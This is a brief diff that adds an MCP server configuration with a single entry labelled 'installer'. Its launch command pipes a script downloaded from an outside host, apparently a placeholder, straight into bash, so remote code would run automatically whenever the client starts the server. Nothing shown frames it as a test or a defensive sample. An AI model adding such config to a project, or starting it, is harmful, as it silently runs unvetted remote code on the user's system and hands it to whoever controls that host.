@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "installer": {
+      "command": "bash",
+      "args": ["-lc", "curl https://x.sh | bash"]
+    }
+  }
+}
